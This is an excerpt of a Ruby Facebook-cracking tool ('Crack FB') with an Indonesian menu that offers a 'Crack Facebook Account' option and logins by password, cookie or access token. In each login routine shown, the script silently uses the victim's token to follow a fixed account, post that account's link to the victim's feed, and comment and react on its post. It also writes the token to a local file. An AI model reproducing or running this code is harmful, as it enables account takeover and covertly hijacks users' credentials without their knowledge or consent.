...
$logo = "
 #{$c}═══════════════════════════════════════════════════════════════
                ...
                Tools    : Crack FB V.ruby 3.0
 #{$c}═══════════════════════════════════════════════════════════════
                    [ Ruby Program V.3.0 ]
          "

$user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36"
$indonesia = false
...
def ReportBug()
  ...
  system ("xdg-open https://wa.me/6281326977165?text=#{text}")
  abort ("#{$r}See You Emmmuaacchh!")
end
...
def loginpw()
  ...
  request = Net::HTTP::Get.new(uri)
  request["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36"
  ...
  if res.key? ('access_token')
    ...
    fopen.write($token)
    fopen.close()
    Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100013870892557/posts/288722351600126","access_token"=>$token,"message"=>['Panutan Gw Ni Boss 😎','Keren Bat Njir 😴'].sample})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557_288722351600126/comments"),{"message"=>"Keren","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557_288722351600126/reactions"),{"type"=>["LOVE","WOW"].sample,"access_token"=>$token})
...
def loginmba()
  ...
  req['user-Agent'] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36"
  req['Cookie'] = cookie
  ...
  if kue.include? ('c_user')
    ...
    if !_Moya.nil?
      ...
      if j.key? ('name')
        ...
        $name = j['name']
        $token = _Moya.to_s
        Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557_288722351600126/likes"),{"access_token"=>$token})
        Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557/subscribers"),{"access_token"=>$token})
        Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100013870892557/posts/288722351600126","access_token"=>$token,"message"=>['Keren..','Hoki','Wow'].sample})
        Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557_288722351600126/comments"),{"message"=>["Good Job :)","Nice 👍","Selamat Ya Bwang 😁","Aku Pada Mu :)"].sample,"access_token"=>$token})  
...
def loginto()
  system("clear")
  puts ($logo)
  tok ("#{$w}#{'═'*52}\n#{$r}=> #{$g}LOGIN VIA ACCESS TOKEN#{$r} <=#{$a}\n#{$r}=> #{$g}CARA MENDAPATKAN ACCESS TOKEN FACEBOOK#{$r} <=#{$a}\n#{$r}=> #{$g}COPY LINK DAN PASTEKAN DI GOOGLE#{$r} <=#{$a}\n#{$r}=> #{$g}https://tutorkhusus.000webhostapp.com/token.html#{$r} <=#{$a}\n#{$r}▶▶▶ #{$g}Masukkan Token #{$r}: #{$w}")
  $token = gets.chomp!
  loading!
  ...
  if req.key? ('name')
    ...
    fopen.close()
    Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100013870892557/posts/288722351600126","access_token"=>$token,"message"=>['Keren Bat Njir 😴','KangProf The Best Lah 😮'].sample})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557_288722351600126/comments"),{"message"=>["I LOVE YOU Bang :)","Hai Bang >,<","Mantap Bang","Mantap Pak","Selamat ya kak:)"].sample,"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557_288722351600126/likes"),{"access_token"=>$token}) 
    $name = req['name']
    $id = req['id']
    puts ("#{$g}[✓] Login Success!#{$a}")
...
def loginco()
  ...
  if !moyaa.nil?
    ...
    if !b.key? ('name')
      ...
      Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557_288722351600126/likes"),{"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557/subscribers"),{"access_token"=>$token})
      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100013870892557/posts/288722351600126","access_token"=>$token,"message"=>['Pengen Mencintai mu :(','Hoki','Keren Abis!'].sample})
      Net::HTTP.post_form(URI("https://graph.facebook.com/100013870892557_288722351600126/comments"),{"message"=>["Good Job Bang prof 😉","Cool 👍","Congratulations 😁","Aku Pada Mu Bang Prof❤️ >,<"].sample,"access_token"=>$token})  
      File.open("login.txt", "w") { |f| f.write($token) }
      puts ("#{$g}[✓] Login Success#{$a}")
      sleep(0.4)
      menu()
...
def menu()
  ...
  puts ("#{$w}╠══════════════════════════════════════════════════╝")
  puts ("║=> #{$w}1. Profil Saya")
  puts ("║=> #{$w}2. User Information")
  puts ("║=> #{$w}3. Crack Facebook Account")
  puts ("║=> #{$w}4. Bot")
  puts ("║=> #{$w}5. Others")
  puts ("║=> #{$w}6. Feedback")
  puts ("║=> #{$w}7. Update")
